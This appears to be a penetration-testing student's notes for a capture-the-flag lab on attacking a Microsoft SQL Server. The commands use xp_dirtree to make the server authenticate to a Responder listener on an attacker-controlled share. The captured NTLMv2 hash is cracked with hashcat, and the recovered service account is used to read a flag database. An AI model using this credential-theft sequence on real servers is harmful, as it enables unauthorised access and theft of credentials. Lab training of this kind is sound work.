# [[Attacking SQL Databases]]

### What is the password for the "mssqlsvc" user?
![[Screenshot 2026-05-14 at 11.38.37.png]]

```shell
python3 /opt/pipx/venvs/netexec/bin/mssqlclient.py -p 1433 htbdbuser@10.129.203.12
```
![[Screenshot 2026-05-14 at 11.45.39.png]]

```cmd
SELECT srvname, isremote FROM sysservers;
```
![[Screenshot 2026-05-14 at 11.58.25.png]]

```shell
sudo responder -I tun0
```
![[Screenshot 2026-05-14 at 11.59.01.png]]
![[Screenshot 2026-05-14 at 11.59.26.png]]

```cmd
EXEC master..xp_dirtree '\\10.10.14.56\share\';
```
![[Screenshot 2026-05-14 at 11.58.49.png]]

```shell
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
![[Screenshot 2026-05-14 at 11.59.54.png]]

### Enumerate the "flagDB" database and submit a flag as your answer.

```shell
python3 /opt/pipx/venvs/netexec/bin/mssqlclient.py -p 1433 mssqlsvc@10.129.203.12 -windows-auth
```

```cmd
SELECT IS_SRVROLEMEMBER('sysadmin')
```

```cmd
SELECT name FROM sys.databases;

use flagDB;

SELECT name FROM sys.tables;

SELECT * FROM tb_flag;
```
![[Screenshot 2026-05-14 at 12.10.22.png]]
